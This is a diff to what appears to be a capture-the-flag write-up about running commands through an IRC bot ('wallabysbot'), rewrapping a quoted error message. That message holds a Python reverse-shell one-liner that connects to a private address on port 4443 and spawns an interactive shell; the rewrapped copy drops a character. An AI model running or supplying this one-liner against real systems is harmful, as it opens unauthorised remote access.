@@ -304,5 +304,8 @@ Sopel is My Friend
 In using the bot, I find some difficulty with running bash or Python commands. They're all erroring out, and I'm starting to think it's the bot itself. I can do simple commands like `whoami` and `pwd` but it can't execute past that.
 
 ```
-<wallabysbot> FileNotFoundError: [Errno 2] No such file or directory: 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.xx.xx",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' (file "/usr/lib/python3.5/subprocess.py", line 1551, in _execute_child)
+<wallabysbot> FileNotFoundError: [Errno 2] No such file or directory: 'python -c \'import
+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.xx.xx",4443));os.dup2(s.fileno(),
+); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' (file
+"/usr/lib/python3.5/subprocess.py", line 1551, in _execute_child)
 ```
